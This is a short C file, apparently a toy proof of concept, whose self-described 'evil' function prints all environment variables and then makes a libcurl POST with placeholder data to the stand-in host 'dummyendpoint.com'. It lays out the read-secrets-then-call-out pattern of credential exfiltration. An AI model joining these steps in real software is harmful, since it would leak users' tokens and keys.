#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>

extern char **environ;

void gravy(void) {
    printf("I am completely evil, and will now print all of your environment variables!\n");

    char **env = environ;
    
    while (*env) {
        printf("%s\n", *env);
        env++;
    }

    // -------------------
    // POST request example
    // -------------------

    CURL *curl;
    CURLcode res;
    
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();

    curl_easy_setopt(curl, CURLOPT_URL, "http://dummyendpoint.com/post");
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    const char *postData = "field1=value1&field2=value2";
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData);

    res = curl_easy_perform(curl);
    if(res != CURLE_OK)
        fprintf(stderr, "POST request failed: %s\n", curl_easy_strerror(res));
    else
        printf("\nPOST request succeeded.\n");

    curl_easy_cleanup(curl);
    curl_global_cleanup();
}
